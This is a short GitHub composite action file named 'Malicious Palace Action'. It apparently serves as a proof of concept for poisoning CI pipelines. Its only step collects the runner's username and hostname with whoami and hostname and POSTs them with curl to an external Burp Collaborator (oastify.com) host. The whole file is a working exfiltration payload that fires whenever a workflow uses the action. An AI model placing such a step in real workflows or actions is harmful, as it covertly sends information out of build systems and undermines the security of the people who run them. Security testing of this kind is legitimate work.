name: "Malicious Palace Action"
description: "Pings Burp Collaborator"
runs:
  using: "composite"
  steps:
    - shell: bash
      run: |
        whoami > payload.txt
        hostname >> payload.txt
        curl -X POST --data-binary @payload.txt http://ywy71cnrvsa9cyn443vhuso2qtwkka8z.oastify.com/hello
